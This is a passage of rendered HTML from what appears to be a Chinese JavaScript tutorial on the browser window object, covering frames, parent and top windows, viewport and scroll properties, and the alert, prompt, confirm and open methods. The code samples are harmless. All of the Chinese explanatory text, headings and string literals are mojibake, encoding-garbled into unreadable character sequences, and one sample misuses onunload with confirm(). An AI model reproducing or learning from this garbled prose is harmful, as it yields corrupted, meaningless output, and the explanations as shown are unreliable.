</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="window-framesï¼Œwindow-length"><a href="#window-framesï¼Œwindow-length" class="header-anchor">#</a> window.framesï¼Œwindow.length</h3> <p><code>window.frames</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜ä¸ºé¡µé¢å†…æ‰€æœ‰æ¡†æ¶çª—å£ï¼ŒåŒ…æ‹¬<code>frame</code>å…ƒç´ å’Œ<code>iframe</code>å…ƒç´ ã€‚<code>window.frames[0]</code>è¡¨ç¤ºé¡µé¢ä¸­ç¬¬ä¸€ä¸ªæ¡†æ¶çª—å£ã€‚</p> <p>å¦‚æœ<code>iframe</code>å…ƒç´ è®¾ç½®äº†<code>id</code>æˆ–<code>name</code>å±æ€§ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨å±æ€§å€¼ï¼Œå¼•ç”¨è¿™ä¸ª<code>iframe</code>çª—å£ã€‚æ¯”å¦‚<code>&lt;iframe name=&quot;myIFrame&quot;&gt;</code>å¯ä»¥ç”¨<code>frames['myIFrame']</code>æˆ–è€…<code>frames.myIFrame</code>æ¥å¼•ç”¨ã€‚</p> <p><code>frames</code>å±æ€§å®é™…ä¸Šæ˜¯<code>window</code>å¯¹è±¡çš„åˆ«åã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>frames <span class="token operator">===</span> window <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å› æ­¤ï¼Œ<code>frames[0]</code>ä¹Ÿå¯ä»¥ç”¨<code>window[0]</code>è¡¨ç¤ºã€‚ä½†æ˜¯ï¼Œä»è¯­ä¹‰ä¸Šçœ‹ï¼Œ<code>frames</code>æ›´æ¸…æ™°ï¼Œè€Œä¸”è€ƒè™‘åˆ°<code>window</code>è¿˜æ˜¯å…¨å±€å¯¹è±¡ï¼Œå› æ­¤æ¨èè¡¨ç¤ºå¤šçª—å£æ—¶ï¼Œæ€»æ˜¯ä½¿ç”¨<code>frames[0]</code>çš„å†™æ³•ã€‚æ›´å¤šä»‹ç»è¯·çœ‹ä¸‹æ–‡çš„ã€Šå¤šçª—å£æ“ä½œã€‹éƒ¨åˆ†ã€‚</p> <p><code>window.length</code>å±æ€§è¿”å›å½“å‰ç½‘é¡µåŒ…å«çš„æ¡†æ¶æ€»æ•°ã€‚å¦‚æœå½“å‰ç½‘é¡µä¸åŒ…å«<code>frame</code>å’Œ<code>iframe</code>å…ƒç´ ï¼Œé‚£ä¹ˆ<code>window.length</code>å°±è¿”å›<code>0</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>length <span class="token operator">===</span> window<span class="token punctuation">.</span>length <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œ<code>window.frames.length</code>ä¸<code>window.length</code>åº”è¯¥æ˜¯ç›¸ç­‰çš„ã€‚</p> <h3 id="window-frameelement"><a href="#window-frameelement" class="header-anchor">#</a> window.frameElement</h3> <p><code>window.frameElement</code>å±æ€§ä¸»è¦ç”¨äºå½“å‰çª—å£åµŒåœ¨å¦ä¸€ä¸ªç½‘é¡µçš„æƒ…å†µï¼ˆåµŒå…¥<code>&lt;object&gt;</code>ã€<code>&lt;iframe&gt;</code>æˆ–<code>&lt;embed&gt;</code>å…ƒç´ ï¼‰ï¼Œè¿”å›å½“å‰çª—å£æ‰€åœ¨çš„é‚£ä¸ªå…ƒç´ èŠ‚ç‚¹ã€‚å¦‚æœå½“å‰çª—å£æ˜¯é¡¶å±‚çª—å£ï¼Œæˆ–è€…æ‰€åµŒå…¥çš„é‚£ä¸ªç½‘é¡µä¸æ˜¯åŒæºçš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;iframe src=&quot;about.html&quot;&gt;&lt;/iframe&gt;</span>

<span class="token comment">// ä¸‹é¢çš„è„šæœ¬åœ¨ about.html é‡Œé¢</span>
<span class="token keyword">var</span> frameEl <span class="token operator">=</span> window<span class="token punctuation">.</span>frameElement<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>frameEl<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  frameEl<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'other.html'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>frameEl</code>å˜é‡å°±æ˜¯<code>&lt;iframe&gt;</code>å…ƒç´ ã€‚</p> <h3 id="window-topï¼Œwindow-parent"><a href="#window-topï¼Œwindow-parent" class="header-anchor">#</a> window.topï¼Œwindow.parent</h3> <p><code>window.top</code>å±æ€§æŒ‡å‘æœ€é¡¶å±‚çª—å£ï¼Œä¸»è¦ç”¨äºåœ¨æ¡†æ¶çª—å£ï¼ˆframeï¼‰é‡Œé¢è·å–é¡¶å±‚çª—å£ã€‚</p> <p><code>window.parent</code>å±æ€§æŒ‡å‘çˆ¶çª—å£ã€‚å¦‚æœå½“å‰çª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œ<code>window.parent</code>æŒ‡å‘è‡ªèº«ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>parent <span class="token operator">!==</span> window<span class="token punctuation">.</span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// è¡¨æ˜å½“å‰çª—å£åµŒå…¥ä¸æ­¢ä¸€å±‚</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>å¯¹äºä¸åŒ…å«æ¡†æ¶çš„ç½‘é¡µï¼Œè¿™ä¸¤ä¸ªå±æ€§ç­‰åŒäº<code>window</code>å¯¹è±¡ã€‚</p> <h3 id="window-status"><a href="#window-status" class="header-anchor">#</a> window.status</h3> <p><code>window.status</code>å±æ€§ç”¨äºè¯»å†™æµè§ˆå™¨çŠ¶æ€æ çš„æ–‡æœ¬ã€‚ä½†æ˜¯ï¼Œç°åœ¨å¾ˆå¤šæµè§ˆå™¨éƒ½ä¸å…è®¸æ”¹å†™çŠ¶æ€æ æ–‡æœ¬ï¼Œæ‰€ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ä¸ä¸€å®šæœ‰æ•ˆã€‚</p> <h3 id="window-devicepixelratio"><a href="#window-devicepixelratio" class="header-anchor">#</a> window.devicePixelRatio</h3> <p><code>window.devicePixelRatio</code>å±æ€§è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œè¡¨ç¤ºä¸€ä¸ª CSS åƒç´ çš„å¤§å°ä¸ä¸€ä¸ªç‰©ç†åƒç´ çš„å¤§å°ä¹‹é—´çš„æ¯”ç‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ª CSS åƒç´ ç”±å¤šå°‘ä¸ªç‰©ç†åƒç´ ç»„æˆã€‚å®ƒå¯ä»¥ç”¨äºåˆ¤æ–­ç”¨æˆ·çš„æ˜¾ç¤ºç¯å¢ƒï¼Œå¦‚æœè¿™ä¸ªæ¯”ç‡è¾ƒå¤§ï¼Œå°±è¡¨ç¤ºç”¨æˆ·æ­£åœ¨ä½¿ç”¨é«˜æ¸…å±å¹•ï¼Œå› æ­¤å¯ä»¥æ˜¾ç¤ºè¾ƒå¤§åƒç´ çš„å›¾ç‰‡ã€‚</p> <h3 id="ä½ç½®å¤§å°å±æ€§"><a href="#ä½ç½®å¤§å°å±æ€§" class="header-anchor">#</a> ä½ç½®å¤§å°å±æ€§</h3> <p>ä»¥ä¸‹å±æ€§è¿”å›<code>window</code>å¯¹è±¡çš„ä½ç½®ä¿¡æ¯å’Œå¤§å°ä¿¡æ¯ã€‚</p> <p><strong>ï¼ˆ1ï¼‰window.screenXï¼Œwindow.screenY</strong></p> <p><code>window.screenX</code>å’Œ<code>window.screenY</code>å±æ€§ï¼Œè¿”å›æµè§ˆå™¨çª—å£å·¦ä¸Šè§’ç›¸å¯¹äºå½“å‰å±å¹•å·¦ä¸Šè§’çš„æ°´å¹³è·ç¦»å’Œå‚ç›´è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p> <p><strong>ï¼ˆ2ï¼‰ window.innerHeightï¼Œwindow.innerWidth</strong></p> <p><code>window.innerHeight</code>å’Œ<code>window.innerWidth</code>å±æ€§ï¼Œè¿”å›ç½‘é¡µåœ¨å½“å‰çª—å£ä¸­å¯è§éƒ¨åˆ†çš„é«˜åº¦å’Œå®½åº¦ï¼Œå³â€œè§†å£â€ï¼ˆviewportï¼‰çš„å¤§å°ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p> <p>ç”¨æˆ·æ”¾å¤§ç½‘é¡µçš„æ—¶å€™ï¼ˆæ¯”å¦‚å°†ç½‘é¡µä»100%çš„å¤§å°æ”¾å¤§ä¸º200%ï¼‰ï¼Œè¿™ä¸¤ä¸ªå±æ€§ä¼šå˜å°ã€‚å› ä¸ºè¿™æ—¶ç½‘é¡µçš„åƒç´ å¤§å°ä¸å˜ï¼ˆæ¯”å¦‚å®½åº¦è¿˜æ˜¯960åƒç´ ï¼‰ï¼Œåªæ˜¯æ¯ä¸ªåƒç´ å æ®çš„å±å¹•ç©ºé—´å˜å¤§äº†ï¼Œå› ä¸ºå¯è§éƒ¨åˆ†ï¼ˆè§†å£ï¼‰å°±å˜å°äº†ã€‚</p> <p>æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå±æ€§å€¼åŒ…æ‹¬æ»šåŠ¨æ¡çš„é«˜åº¦å’Œå®½åº¦ã€‚</p> <p><strong>ï¼ˆ3ï¼‰window.outerHeightï¼Œwindow.outerWidth</strong></p> <p><code>window.outerHeight</code>å’Œ<code>window.outerWidth</code>å±æ€§è¿”å›æµè§ˆå™¨çª—å£çš„é«˜åº¦å’Œå®½åº¦ï¼ŒåŒ…æ‹¬æµè§ˆå™¨èœå•å’Œè¾¹æ¡†ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p> <p><strong>ï¼ˆ4ï¼‰window.scrollXï¼Œwindow.scrollY</strong></p> <p><code>window.scrollX</code>å±æ€§è¿”å›é¡µé¢çš„æ°´å¹³æ»šåŠ¨è·ç¦»ï¼Œ<code>window.scrollY</code>å±æ€§è¿”å›é¡µé¢çš„å‚ç›´æ»šåŠ¨è·ç¦»ï¼Œå•ä½éƒ½ä¸ºåƒç´ ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p> <p>æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå±æ€§çš„è¿”å›å€¼ä¸æ˜¯æ•´æ•°ï¼Œè€Œæ˜¯åŒç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœé¡µé¢æ²¡æœ‰æ»šåŠ¨ï¼Œå®ƒä»¬çš„å€¼å°±æ˜¯<code>0</code>ã€‚</p> <p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœç”¨æˆ·å‘ä¸‹æ‹‰åŠ¨äº†å‚ç›´æ»šåŠ¨æ¡75åƒç´ ï¼Œé‚£ä¹ˆ<code>window.scrollY</code>å°±æ˜¯75å·¦å³ã€‚ç”¨æˆ·æ°´å¹³å‘å³æ‹‰åŠ¨æ°´å¹³æ»šåŠ¨æ¡200åƒç´ ï¼Œ<code>window.scrollX</code>å°±æ˜¯200å·¦å³ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>scrollY <span class="token operator">&lt;</span> <span class="token number">75</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span><span class="token function">scroll</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœé¡µé¢å‘ä¸‹æ»šåŠ¨çš„è·ç¦»å°äº75åƒç´ ï¼Œé‚£ä¹ˆé¡µé¢å‘ä¸‹æ»šåŠ¨75åƒç´ ã€‚</p> <p><strong>ï¼ˆ5ï¼‰window.pageXOffsetï¼Œwindow.pageYOffset</strong></p> <p><code>window.pageXOffset</code>å±æ€§å’Œ<code>window.pageYOffset</code>å±æ€§ï¼Œæ˜¯<code>window.scrollX</code>å’Œ<code>window.scrollY</code>åˆ«åã€‚</p> <h3 id="ç»„ä»¶å±æ€§"><a href="#ç»„ä»¶å±æ€§" class="header-anchor">#</a> ç»„ä»¶å±æ€§</h3> <p>ç»„ä»¶å±æ€§è¿”å›æµè§ˆå™¨çš„ç»„ä»¶å¯¹è±¡ã€‚è¿™æ ·çš„å±æ€§æœ‰ä¸‹é¢å‡ ä¸ªã€‚</p> <ul><li><code>window.locationbar</code>ï¼šåœ°å€æ å¯¹è±¡</li> <li><code>window.menubar</code>ï¼šèœå•æ å¯¹è±¡</li> <li><code>window.scrollbars</code>ï¼šçª—å£çš„æ»šåŠ¨æ¡å¯¹è±¡</li> <li><code>window.toolbar</code>ï¼šå·¥å…·æ å¯¹è±¡</li> <li><code>window.statusbar</code>ï¼šçŠ¶æ€æ å¯¹è±¡</li> <li><code>window.personalbar</code>ï¼šç”¨æˆ·å®‰è£…çš„ä¸ªäººå·¥å…·æ å¯¹è±¡</li></ul> <p>è¿™äº›å¯¹è±¡çš„<code>visible</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¿™äº›ç»„ä»¶æ˜¯å¦å¯è§ã€‚è¿™äº›å±æ€§åªè¯»ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>locationbar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>menubar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>scrollbars<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>toolbar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>statusbar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>personalbar<span class="token punctuation">.</span>visible
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="å…¨å±€å¯¹è±¡å±æ€§"><a href="#å…¨å±€å¯¹è±¡å±æ€§" class="header-anchor">#</a> å…¨å±€å¯¹è±¡å±æ€§</h3> <p>å…¨å±€å¯¹è±¡å±æ€§æŒ‡å‘ä¸€äº›æµè§ˆå™¨åŸç”Ÿçš„å…¨å±€å¯¹è±¡ã€‚</p> <ul><li><code>window.document</code>ï¼šæŒ‡å‘<code>document</code>å¯¹è±¡ï¼Œè¯¦è§ã€Šdocument å¯¹è±¡ã€‹ä¸€ç« ã€‚æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§æœ‰åŒæºé™åˆ¶ã€‚åªæœ‰æ¥è‡ªåŒæºçš„è„šæœ¬æ‰èƒ½è¯»å–è¿™ä¸ªå±æ€§ã€‚</li> <li><code>window.location</code>ï¼šæŒ‡å‘<code>Location</code>å¯¹è±¡ï¼Œç”¨äºè·å–å½“å‰çª—å£çš„ URL ä¿¡æ¯ã€‚å®ƒç­‰åŒäº<code>document.location</code>å±æ€§ï¼Œè¯¦è§ã€ŠLocation å¯¹è±¡ã€‹ä¸€ç« ã€‚</li> <li><code>window.navigator</code>ï¼šæŒ‡å‘<code>Navigator</code>å¯¹è±¡ï¼Œç”¨äºè·å–ç¯å¢ƒä¿¡æ¯ï¼Œè¯¦è§ã€ŠNavigator å¯¹è±¡ã€‹ä¸€ç« ã€‚</li> <li><code>window.history</code>ï¼šæŒ‡å‘<code>History</code>å¯¹è±¡ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„æµè§ˆå†å²ï¼Œè¯¦è§ã€ŠHistory å¯¹è±¡ã€‹ä¸€ç« ã€‚</li> <li><code>window.localStorage</code>ï¼šæŒ‡å‘æœ¬åœ°å‚¨å­˜çš„ localStorage æ•°æ®ï¼Œè¯¦è§ã€ŠStorage æ¥å£ã€‹ä¸€ç« ã€‚</li> <li><code>window.sessionStorage</code>ï¼šæŒ‡å‘æœ¬åœ°å‚¨å­˜çš„ sessionStorage æ•°æ®ï¼Œè¯¦è§ã€ŠStorage æ¥å£ã€‹ä¸€ç« ã€‚</li> <li><code>window.console</code>ï¼šæŒ‡å‘<code>console</code>å¯¹è±¡ï¼Œç”¨äºæ“ä½œæ§åˆ¶å°ï¼Œè¯¦è§ã€Šconsole å¯¹è±¡ã€‹ä¸€ç« ã€‚</li> <li><code>window.screen</code>ï¼šæŒ‡å‘<code>Screen</code>å¯¹è±¡ï¼Œè¡¨ç¤ºå±å¹•ä¿¡æ¯ï¼Œè¯¦è§ã€ŠScreen å¯¹è±¡ã€‹ä¸€ç« ã€‚</li></ul> <h3 id="window-issecurecontext"><a href="#window-issecurecontext" class="header-anchor">#</a> window.isSecureContext</h3> <p><code>window.isSecureContext</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºå½“å‰çª—å£æ˜¯å¦å¤„åœ¨åŠ å¯†ç¯å¢ƒã€‚å¦‚æœæ˜¯ HTTPS åè®®ï¼Œå°±æ˜¯<code>true</code>ï¼Œå¦åˆ™å°±æ˜¯<code>false</code>ã€‚</p> <h2 id="_2-window-å¯¹è±¡çš„æ–¹æ³•"><a href="#_2-window-å¯¹è±¡çš„æ–¹æ³•" class="header-anchor">#</a> 2.window å¯¹è±¡çš„æ–¹æ³•</h2> <h3 id="window-alert-ï¼Œwindow-prompt-ï¼Œwindow-confirm"><a href="#window-alert-ï¼Œwindow-prompt-ï¼Œwindow-confirm" class="header-anchor">#</a> window.alert()ï¼Œwindow.prompt()ï¼Œwindow.confirm()</h3> <p><code>window.alert()</code>ã€<code>window.prompt()</code>ã€<code>window.confirm()</code>éƒ½æ˜¯æµè§ˆå™¨ä¸ç”¨æˆ·äº’åŠ¨çš„å…¨å±€æ–¹æ³•ã€‚å®ƒä»¬ä¼šå¼¹å‡ºä¸åŒçš„å¯¹è¯æ¡†ï¼Œè¦æ±‚ç”¨æˆ·åšå‡ºå›åº”ã€‚æ³¨æ„ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œéƒ½æ˜¯æµè§ˆå™¨ç»Ÿä¸€è§„å®šçš„å¼æ ·ï¼Œæ— æ³•å®šåˆ¶ã€‚</p> <p><strong>ï¼ˆ1ï¼‰window.alert()</strong></p> <p><code>window.alert()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œåªæœ‰ä¸€ä¸ªâ€œç¡®å®šâ€æŒ‰é’®ï¼Œå¾€å¾€ç”¨æ¥é€šçŸ¥ç”¨æˆ·æŸäº›ä¿¡æ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ç”¨æˆ·åªæœ‰ç‚¹å‡»â€œç¡®å®šâ€æŒ‰é’®ï¼Œå¯¹è¯æ¡†æ‰ä¼šæ¶ˆå¤±ã€‚å¯¹è¯æ¡†å¼¹å‡ºæœŸé—´ï¼Œæµè§ˆå™¨çª—å£å¤„äºå†»ç»“çŠ¶æ€ï¼Œå¦‚æœä¸ç‚¹â€œç¡®å®šâ€æŒ‰é’®ï¼Œç”¨æˆ·ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ã€‚</p> <p><code>window.alert()</code>æ–¹æ³•çš„å‚æ•°åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ²¡æ³•ä½¿ç”¨ CSS æ ·å¼ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>\n</code>æŒ‡å®šæ¢è¡Œã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'æœ¬æ¡æç¤º\nåˆ†æˆä¸¤è¡Œ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>ï¼ˆ2ï¼‰window.prompt()</strong></p> <p><code>window.prompt()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œæç¤ºæ–‡å­—çš„ä¸‹æ–¹ï¼Œè¿˜æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶æœ‰â€œç¡®å®šâ€å’Œâ€œå–æ¶ˆâ€ä¸¤ä¸ªæŒ‰é’®ã€‚å®ƒå¾€å¾€ç”¨æ¥è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">'æ‚¨çš„å¹´é¾„ï¼Ÿ'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæ–‡å­—æç¤ºä¸ºâ€œæ‚¨çš„å¹´é¾„ï¼Ÿâ€ï¼Œè¦æ±‚ç”¨æˆ·åœ¨å¯¹è¯æ¡†ä¸­è¾“å…¥è‡ªå·±çš„å¹´é¾„ï¼ˆé»˜è®¤æ˜¾ç¤º25ï¼‰ã€‚ç”¨æˆ·å¡«å…¥çš„å€¼ï¼Œä¼šä½œä¸ºè¿”å›å€¼å­˜å…¥å˜é‡<code>result</code>ã€‚</p> <p><code>window.prompt()</code>çš„è¿”å›å€¼æœ‰ä¸¤ç§æƒ…å†µï¼Œå¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼ˆæœ‰å¯èƒ½æ˜¯ç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯<code>null</code>ã€‚å…·ä½“åˆ†æˆä¸‰ç§æƒ…å†µã€‚</p> <ol><li>ç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œå¹¶ç‚¹å‡»â€œç¡®å®šâ€ï¼Œåˆ™ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯å°±æ˜¯è¿”å›å€¼ã€‚</li> <li>ç”¨æˆ·æ²¡æœ‰è¾“å…¥ä¿¡æ¯ï¼Œç›´æ¥ç‚¹å‡»â€œç¡®å®šâ€ï¼Œåˆ™è¾“å…¥æ¡†çš„é»˜è®¤å€¼å°±æ˜¯è¿”å›å€¼ã€‚</li> <li>ç”¨æˆ·ç‚¹å‡»äº†â€œå–æ¶ˆâ€ï¼ˆæˆ–è€…æŒ‰äº† ESC æŒ‰é’®ï¼‰ï¼Œåˆ™è¿”å›å€¼æ˜¯<code>null</code>ã€‚</li></ol> <p><code>window.prompt()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æœ€å¥½æ€»æ˜¯æä¾›ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œä¸ºè¾“å…¥æ¡†çš„é»˜è®¤å€¼ã€‚</p> <p><strong>ï¼ˆ3ï¼‰window.confirm()</strong></p> <p><code>window.confirm()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œé™¤äº†æç¤ºä¿¡æ¯ä¹‹å¤–ï¼Œåªæœ‰â€œç¡®å®šâ€å’Œâ€œå–æ¶ˆâ€ä¸¤ä¸ªæŒ‰é’®ï¼Œå¾€å¾€ç”¨æ¥å¾è¯¢ç”¨æˆ·æ˜¯å¦åŒæ„ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'ä½ æœ€è¿‘å¥½å—ï¼Ÿ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œä¸Šé¢åªæœ‰ä¸€è¡Œæ–‡å­—â€œä½ æœ€è¿‘å¥½å—ï¼Ÿâ€ï¼Œç”¨æˆ·é€‰æ‹©ç‚¹å‡»â€œç¡®å®šâ€æˆ–â€œå–æ¶ˆâ€ã€‚</p> <p><code>confirm</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå¦‚æœç”¨æˆ·ç‚¹å‡»â€œç¡®å®šâ€ï¼Œè¿”å›<code>true</code>ï¼›å¦‚æœç”¨æˆ·ç‚¹å‡»â€œå–æ¶ˆâ€ï¼Œåˆ™è¿”å›<code>false</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> okay <span class="token operator">=</span> <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'Please confirm this message.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>okay<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// ç”¨æˆ·æŒ‰ä¸‹â€œç¡®å®šâ€</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// ç”¨æˆ·æŒ‰ä¸‹â€œå–æ¶ˆâ€</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><code>confirm</code>çš„ä¸€ä¸ªç”¨é€”æ˜¯ï¼Œç”¨æˆ·ç¦»å¼€å½“å‰é¡µé¢æ—¶ï¼Œå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œé—®ç”¨æˆ·æ˜¯å¦çœŸçš„è¦ç¦»å¼€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onunload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">'ä½ ç¡®å®šè¦ç¦»å¼€å½“é¢é¡µé¢å—ï¼Ÿ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½å…·æœ‰å µå¡æ•ˆåº”ï¼Œä¸€æ—¦å¼¹å‡ºå¯¹è¯æ¡†ï¼Œæ•´ä¸ªé¡µé¢å°±æ˜¯æš‚åœæ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ·åšå‡ºååº”ã€‚</p> <h3 id="window-open-window-close-ï¼Œwindow-stop"><a href="#window-open-window-close-ï¼Œwindow-stop" class="header-anchor">#</a> window.open(), window.close()ï¼Œwindow.stop()</h3> <p><strong>ï¼ˆ1ï¼‰window.open()</strong></p> <p><code>window.open</code>æ–¹æ³•ç”¨äºæ–°å»ºå¦ä¸€ä¸ªæµè§ˆå™¨çª—å£ï¼Œç±»ä¼¼äºæµè§ˆå™¨èœå•çš„æ–°å»ºçª—å£é€‰é¡¹ã€‚å®ƒä¼šè¿”å›æ–°çª—å£çš„å¼•ç”¨ï¼Œå¦‚æœæ— æ³•æ–°å»ºçª—å£ï¼Œåˆ™è¿”å›<code>null</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token 